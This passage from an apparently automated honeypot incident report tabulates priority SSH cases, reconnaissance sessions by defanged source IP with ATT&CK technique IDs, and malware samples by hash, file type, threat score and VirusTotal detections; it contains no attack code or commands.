| IR-b5aa55eb4b48 | HIGH | `82.64.79[.]135` | 2026-10-20 08:12 | Y | 0 | 0 | `T1078 · T1592` |
| IR-798fa5e1271e | HIGH | `195.178.110[.]217` | 2026-10-20 08:12 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-f3d07b0b2599 | HIGH | `51.38.226[.]55` | 2026-10-20 08:14 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-ec95ef99fef9 | HIGH | `51.38.226[.]55` | 2026-10-20 08:14 | Y | 0 | 0 | `T1078 · T1592` |
| IR-756504165d73 | HIGH | `103.73.220[.]218` | 2026-10-20 08:15 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-2c5a4351695f | HIGH | `103.73.220[.]218` | 2026-10-20 08:15 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f42ba8061c76 | HIGH | `43.106.53[.]56` | 2026-10-20 08:34 | Y | 1 | 0 | `T1078` |
| IR-9990db72eaf5 | HIGH | `43.106.53[.]56` | 2026-10-20 08:34 | Y | 0 | 0 | `T1078` |
| IR-aaacf9e0c9c5 | HIGH | `43.106.53[.]56` | 2026-10-20 08:34 | Y | 4 | 0 | `T1078` |
| IR-08013e4cb672 | HIGH | `218.95.39[.]2` | 2026-10-20 08:42 | Y | 1 | 0 | `T1078 · T1592` |
| IR-0ee7f45026da | HIGH | `103.172.20[.]218` | 2026-10-20 09:11 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-346cd57d7a5d | HIGH | `103.172.20[.]218` | 2026-10-20 09:11 | Y | 0 | 0 | `T1078 · T1592` |
| IR-78b8f8d5c4d4 | HIGH | `207.148.134[.]251` | 2026-10-20 09:36 | Y | 1 | 0 | `T1078 · T1592` |
| IR-d9183bba989b | HIGH | `120.48.50[.]133` | 2026-10-20 09:49 | Y | 0 | 0 | `T1078 · T1105 · T1592` |
| IR-04ecc56966b5 | HIGH | `217.60.255[.]130` | 2026-10-20 10:00 | Y | 0 | 0 | `T1078 · T1592` |
| IR-58b9fb275801 | HIGH | `103.211.76[.]8` | 2026-10-20 10:01 | Y | 1 | 0 | `T1078 · T1592` |
| IR-e369c857fa5e | HIGH | `216.218.206[.]68` | 2026-10-20 10:04 | Y | 3 | 0 | `T1078` |
| IR-b6026d86bb5a | HIGH | `42.200.66[.]164` | 2026-10-20 11:07 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-ba8ad2f2c961 | HIGH | `42.200.66[.]164` | 2026-10-20 11:07 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e89a5de9dbae | HIGH | `114.12.17[.]98` | 2026-10-20 11:07 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-7dd01f07cc94 | HIGH | `114.12.17[.]98` | 2026-10-20 11:07 | Y | 0 | 0 | `T1078 · T1592` |
| IR-79eb4680038b | HIGH | `64.227.176[.]23` | 2026-10-20 11:07 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-a1ea555c26c2 | HIGH | `64.227.176[.]23` | 2026-10-20 11:08 | Y | 0 | 0 | `T1078 · T1592` |
| IR-bda92b373941 | HIGH | `194.238.27[.]48` | 2026-10-20 11:08 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-7929e9c97f21 | HIGH | `194.238.27[.]48` | 2026-10-20 11:08 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5960dc83830a | HIGH | `176.53.159[.]196` | 2026-10-20 11:09 | Y | 0 | 0 | `T1078 · T1592` |
| IR-29970905c167 | HIGH | `101.32.240[.]31` | 2026-10-20 11:14 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-1bd2e9cd8a09 | HIGH | `101.32.240[.]31` | 2026-10-20 11:14 | Y | 0 | 0 | `T1078 · T1592` |
_… 44 more priority case(s) in ir_cases.json_

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `27.156.154[.]3` | **6** | 2026-10-20 01:11 | 2026-10-20 10:12 | 2m | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | **2** | 2026-10-20 05:21 | 2026-10-20 07:12 | 0m | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | **2** | 2026-10-20 01:54 | 2026-10-20 02:15 | 2m | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | **2** | 2026-10-20 13:42 | 2026-10-20 14:40 | 1m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **2** | 2026-10-20 01:19 | 2026-10-20 02:10 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **2** | 2026-10-20 04:19 | 2026-10-20 06:06 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **2** | 2026-10-20 08:21 | 2026-10-20 10:06 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **2** | 2026-10-20 12:18 | 2026-10-20 14:07 | 0m | 0 | `T1592` | 🟢 LOW |
| `177.65.188[.]143` | **2** | 2026-10-20 00:57 | 2026-10-20 02:12 | 0m | 0 | `T1592` | 🟢 LOW |
| `181.231.196[.]74` | **2** | 2026-10-20 05:56 | 2026-10-20 06:02 | 0m | 0 | `T1592` | 🟢 LOW |
| `86.127.235[.]148` | **2** | 2026-10-20 09:05 | 2026-10-20 10:05 | 2m | 0 | `T1592` | 🟢 LOW |
| `101.126.24[.]71` | 1 | 2026-10-20 03:07 | 2026-10-20 03:09 | 120s | 0 | `T1592` | 🟢 LOW |
| `101.126.67[.]70` | 1 | 2026-10-20 06:41 | 2026-10-20 06:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `101.96.199[.]69` | 1 | 2026-10-20 03:35 | 2026-10-20 03:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `101.96.206[.]202` | 1 | 2026-10-20 03:46 | 2026-10-20 03:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.12.176[.]238` | 1 | 2026-10-20 05:09 | 2026-10-20 05:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `111.229.129[.]233` | 1 | 2026-10-20 11:40 | 2026-10-20 11:42 | 120s | 0 | `T1592` | 🟢 LOW |
| `111.231.60[.]55` | 1 | 2026-10-20 04:47 | 2026-10-20 04:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `112.163.135[.]25` | 1 | 2026-10-20 03:57 | 2026-10-20 03:58 | 19s | 0 | `T1592` | 🟢 LOW |
| `112.163.135[.]28` | 1 | 2026-10-20 02:48 | 2026-10-20 02:48 | 15s | 0 | `T1592` | 🟢 LOW |
| `112.194.141[.]59` | 1 | 2026-10-20 01:46 | 2026-10-20 01:46 | 0s | 0 | `T1592` | 🟢 LOW |
| `114.220.238[.]224` | 1 | 2026-10-20 02:40 | 2026-10-20 02:42 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.209[.]194` | 1 | 2026-10-20 03:24 | 2026-10-20 03:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `118.145.239[.]187` | 1 | 2026-10-20 02:43 | 2026-10-20 02:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.196.64[.]77` | 1 | 2026-10-20 06:36 | 2026-10-20 06:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.196.86[.]5` | 1 | 2026-10-20 01:50 | 2026-10-20 01:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.50[.]133` | 1 | 2026-10-20 09:33 | 2026-10-20 09:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.87[.]166` | 1 | 2026-10-20 11:22 | 2026-10-20 11:24 | 120s | 0 | `T1592` | 🟢 LOW |
| `122.114.69[.]235` | 1 | 2026-10-20 01:50 | 2026-10-20 01:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `124.222.128[.]208` | 1 | 2026-10-20 05:07 | 2026-10-20 05:09 | 120s | 0 | `T1592` | 🟢 LOW |
| `125.142.253[.]123` | 1 | 2026-10-20 03:09 | 2026-10-20 03:09 | 18s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-20 02:21 | 2026-10-20 02:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-20 09:41 | 2026-10-20 09:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-20 14:07 | 2026-10-20 14:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | 1 | 2026-10-20 05:11 | 2026-10-20 05:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | 1 | 2026-10-20 08:46 | 2026-10-20 08:47 | 37s | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | 1 | 2026-10-20 10:58 | 2026-10-20 11:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.103[.]211` | 1 | 2026-10-20 09:16 | 2026-10-20 09:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.47.94[.]19` | 1 | 2026-10-20 07:17 | 2026-10-20 07:17 | 0s | 0 | `T1592` | 🟢 LOW |
| `143.198.208[.]150` | 1 | 2026-10-20 10:04 | 2026-10-20 10:05 | 55s | 0 | `T1592` | 🟢 LOW |
| `143.198.208[.]150` | 1 | 2026-10-20 13:45 | 2026-10-20 13:46 | 63s | 0 | `T1592` | 🟢 LOW |
| `150.158.141[.]253` | 1 | 2026-10-20 11:15 | 2026-10-20 11:17 | 120s | 0 | `T1592` | 🟢 LOW |
| `156.225.1[.]31` | 1 | 2026-10-20 12:52 | 2026-10-20 12:52 | 15s | 0 | `T1592` | 🟢 LOW |
| `166.114.138[.]218` | 1 | 2026-10-20 10:51 | 2026-10-20 10:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.104.208[.]133` | 1 | 2026-10-20 03:44 | 2026-10-20 03:45 | 31s | 0 | `T1592` | 🟢 LOW |
| `172.245.194[.]151` | 1 | 2026-10-20 14:33 | 2026-10-20 14:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `175.202.119[.]17` | 1 | 2026-10-20 07:04 | 2026-10-20 07:04 | 28s | 0 | `T1592` | 🟢 LOW |
| `178.128.251[.]47` | 1 | 2026-10-20 05:14 | 2026-10-20 05:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `178.132.198[.]200` | 1 | 2026-10-20 13:37 | 2026-10-20 13:38 | 16s | 0 | `T1592` | 🟢 LOW |
| `180.106.80[.]16` | 1 | 2026-10-20 03:36 | 2026-10-20 03:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.106.83[.]59` | 1 | 2026-10-20 11:15 | 2026-10-20 11:17 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.247.137[.]60` | 1 | 2026-10-20 02:31 | 2026-10-20 02:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `190.226.31[.]165` | 1 | 2026-10-20 11:03 | 2026-10-20 11:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `192.248.150[.]180` | 1 | 2026-10-20 10:26 | 2026-10-20 10:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.112.192[.]91` | 1 | 2026-10-20 03:44 | 2026-10-20 03:44 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `194.226.49[.]237` | 1 | 2026-10-20 01:55 | 2026-10-20 01:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]217` | 1 | 2026-10-20 08:22 | 2026-10-20 08:23 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.62.25[.]203` | 1 | 2026-10-20 14:01 | 2026-10-20 14:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `198.179.70[.]19` | 1 | 2026-10-20 07:08 | 2026-10-20 07:08 | 10s | 0 | `T1592` | 🟢 LOW |
| `198.211.108[.]247` | 1 | 2026-10-20 12:40 | 2026-10-20 12:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `199.165.159[.]41` | 1 | 2026-10-20 01:39 | 2026-10-20 01:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]238` | 1 | 2026-10-20 04:09 | 2026-10-20 04:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]238` | 1 | 2026-10-20 14:11 | 2026-10-20 14:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `20.118.235[.]131` | 1 | 2026-10-20 13:27 | 2026-10-20 13:27 | 9s | 0 | `T1592` | 🟢 LOW |
| `20.118.250[.]192` | 1 | 2026-10-20 12:36 | 2026-10-20 12:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `20.118.27[.]212` | 1 | 2026-10-20 01:23 | 2026-10-20 01:24 | 9s | 0 | `T1592` | 🟢 LOW |
| `200.102.179[.]59` | 1 | 2026-10-20 04:08 | 2026-10-20 04:08 | 29s | 0 | `T1592` | 🟢 LOW |
| `200.31.12[.]165` | 1 | 2026-10-20 07:52 | 2026-10-20 07:52 | 13s | 0 | `T1592` | 🟢 LOW |
| `200.59.88[.]120` | 1 | 2026-10-20 02:58 | 2026-10-20 02:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `207.148.134[.]251` | 1 | 2026-10-20 09:36 | 2026-10-20 09:36 | 5s | 0 | `T1592` | 🟢 LOW |
| `209.38.208[.]214` | 1 | 2026-10-20 02:56 | 2026-10-20 02:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `210.207.242[.]100` | 1 | 2026-10-20 03:32 | 2026-10-20 03:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `211.185.14[.]39` | 1 | 2026-10-20 06:55 | 2026-10-20 06:55 | 3s | 0 | `T1592` | 🟢 LOW |
| `211.193.149[.]175` | 1 | 2026-10-20 05:01 | 2026-10-20 05:01 | 25s | 0 | `T1592` | 🟢 LOW |
| `216.218.206[.]66` | 1 | 2026-10-20 09:28 | 2026-10-20 09:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `217.60.255[.]130` | 1 | 2026-10-20 11:55 | 2026-10-20 11:55 | 4s | 0 | `T1592` | 🟢 LOW |
| `218.95.39[.]2` | 1 | 2026-10-20 08:42 | 2026-10-20 08:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `220.120.83[.]75` | 1 | 2026-10-20 07:45 | 2026-10-20 07:45 | 27s | 0 | `T1592` | 🟢 LOW |
| `220.125.186[.]247` | 1 | 2026-10-20 04:39 | 2026-10-20 04:39 | 25s | 0 | `T1592` | 🟢 LOW |
| `221.124.94[.]188` | 1 | 2026-10-20 04:05 | 2026-10-20 04:05 | 16s | 0 | `T1592` | 🟢 LOW |
| `221.127.133[.]214` | 1 | 2026-10-20 03:04 | 2026-10-20 03:05 | 28s | 0 | `T1592` | 🟢 LOW |
| `221.156.173[.]44` | 1 | 2026-10-20 12:54 | 2026-10-20 12:55 | 28s | 0 | `T1592` | 🟢 LOW |
| `221.156.21[.]112` | 1 | 2026-10-20 12:08 | 2026-10-20 12:09 | 29s | 0 | `T1592` | 🟢 LOW |
| `221.157.130[.]150` | 1 | 2026-10-20 05:57 | 2026-10-20 05:57 | 18s | 0 | `T1592` | 🟢 LOW |
| `222.114.200[.]83` | 1 | 2026-10-20 06:57 | 2026-10-20 06:57 | 28s | 0 | `T1592` | 🟢 LOW |
| `27.156.154[.]3` | 1 | 2026-10-20 12:12 | 2026-10-20 12:13 | 19s | 0 | `T1592` | 🟢 LOW |
| `27.17.30[.]150` | 1 | 2026-10-20 03:37 | 2026-10-20 03:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `27.41.251[.]206` | 1 | 2026-10-20 14:34 | 2026-10-20 14:35 | 23s | 0 | `T1592` | 🟢 LOW |
| `3.130.168[.]2` | 1 | 2026-10-20 06:39 | 2026-10-20 06:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `3.87.196[.]69` | 1 | 2026-10-20 01:30 | 2026-10-20 01:30 | 3s | 0 | `T1592` | 🟢 LOW |
| `31.14.32[.]4` | 1 | 2026-10-20 05:31 | 2026-10-20 05:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `34.14.25[.]25` | 1 | 2026-10-20 04:45 | 2026-10-20 04:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `34.156.111[.]81` | 1 | 2026-10-20 03:22 | 2026-10-20 03:22 | 2s | 0 | `T1592` | 🟢 LOW |
| `34.156.128[.]161` | 1 | 2026-10-20 04:42 | 2026-10-20 04:42 | 3s | 0 | `T1592` | 🟢 LOW |
| `34.156.246[.]29` | 1 | 2026-10-20 02:57 | 2026-10-20 02:57 | 1s | 0 | `T1592` | 🟢 LOW |
| `34.79.144[.]214` | 1 | 2026-10-20 04:00 | 2026-10-20 04:01 | 7s | 0 | `T1592` | 🟢 LOW |
| `35.187.231[.]181` | 1 | 2026-10-20 14:11 | 2026-10-20 14:11 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `36.141.93[.]74` | 1 | 2026-10-20 03:38 | 2026-10-20 03:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `39.170.108[.]144` | 1 | 2026-10-20 11:08 | 2026-10-20 11:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `42.194.201[.]90` | 1 | 2026-10-20 08:14 | 2026-10-20 08:16 | 120s | 0 | `T1592` | 🟢 LOW |
| `42.51.32[.]228` | 1 | 2026-10-20 11:16 | 2026-10-20 11:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]157` | 1 | 2026-10-20 10:02 | 2026-10-20 10:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.156.131[.]22` | 1 | 2026-10-20 02:43 | 2026-10-20 02:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.64.169[.]224` | 1 | 2026-10-20 05:29 | 2026-10-20 05:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `51.158.205[.]203` | 1 | 2026-10-20 13:49 | 2026-10-20 13:49 | 1s | 0 | `T1592` | 🟢 LOW |
| `58.209.82[.]184` | 1 | 2026-10-20 00:56 | 2026-10-20 00:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `58.209.82[.]184` | 1 | 2026-10-20 03:38 | 2026-10-20 03:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `59.2.83[.]147` | 1 | 2026-10-20 13:19 | 2026-10-20 13:20 | 29s | 0 | `T1592` | 🟢 LOW |
| `61.171.49[.]252` | 1 | 2026-10-20 14:42 | 2026-10-20 14:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `61.76.97[.]173` | 1 | 2026-10-20 04:53 | 2026-10-20 04:53 | 23s | 0 | `T1592` | 🟢 LOW |
| `62.210.198[.]27` | 1 | 2026-10-20 02:09 | 2026-10-20 02:10 | 31s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]253` | 1 | 2026-10-20 01:02 | 2026-10-20 01:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]167` | 1 | 2026-10-20 03:41 | 2026-10-20 03:41 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]197` | 1 | 2026-10-20 04:50 | 2026-10-20 04:50 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]230` | 1 | 2026-10-20 04:06 | 2026-10-20 04:06 | 4s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-10-20 01:16 | 2026-10-20 01:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]42` | 1 | 2026-10-20 11:43 | 2026-10-20 11:44 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]171` | 1 | 2026-10-20 14:37 | 2026-10-20 14:37 | 1s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]222` | 1 | 2026-10-20 12:50 | 2026-10-20 12:50 | 1s | 0 | `T1592` | 🟢 LOW |
| `66.205.236[.]194` | 1 | 2026-10-20 10:21 | 2026-10-20 10:22 | 29s | 0 | `T1592` | 🟢 LOW |
| `66.228.62[.]150` | 1 | 2026-10-20 02:42 | 2026-10-20 02:42 | 2s | 0 | `T1592` | 🟢 LOW |
| `66.240.223[.]240` | 1 | 2026-10-20 05:11 | 2026-10-20 05:11 | 10s | 0 | `T1592` | 🟢 LOW |
| `68.61.105[.]108` | 1 | 2026-10-20 01:00 | 2026-10-20 01:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `71.6.232[.]24` | 1 | 2026-10-20 01:32 | 2026-10-20 01:32 | 7s | 0 | `T1592` | 🟢 LOW |
| `72.133.52[.]145` | 1 | 2026-10-20 07:33 | 2026-10-20 07:33 | 16s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-10-20 06:38 | 2026-10-20 06:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-10-20 10:14 | 2026-10-20 10:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]162` | 1 | 2026-10-20 12:23 | 2026-10-20 12:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `80.94.95[.]223` | 1 | 2026-10-20 12:23 | 2026-10-20 12:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `83.251.102[.]189` | 1 | 2026-10-20 12:01 | 2026-10-20 12:02 | 24s | 0 | `T1592` | 🟢 LOW |
| `84.54.71[.]159` | 1 | 2026-10-20 12:48 | 2026-10-20 12:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.239.151[.]54` | 1 | 2026-10-20 05:36 | 2026-10-20 05:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `88.147.153[.]92` | 1 | 2026-10-20 03:26 | 2026-10-20 03:26 | 13s | 0 | `T1592` | 🟢 LOW |
| `91.144.21[.]210` | 1 | 2026-10-20 12:02 | 2026-10-20 12:02 | 3s | 0 | `T1592` | 🟢 LOW |
| `91.218.99[.]24` | 1 | 2026-10-20 04:57 | 2026-10-20 04:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.220.204[.]13` | 1 | 2026-10-20 08:13 | 2026-10-20 08:13 | 11s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]14` | 1 | 2026-10-20 03:27 | 2026-10-20 03:27 | 18s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `92.118.39[.]71` | 1 | 2026-10-20 04:13 | 2026-10-20 04:13 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `96.126.117[.]80` | 1 | 2026-10-20 08:05 | 2026-10-20 08:05 | 2s | 0 | `T1592` | 🟢 LOW |
| `97.97.198[.]156` | 1 | 2026-10-20 04:02 | 2026-10-20 04:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `99.101.71[.]213` | 1 | 2026-10-20 11:33 | 2026-10-20 11:33 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
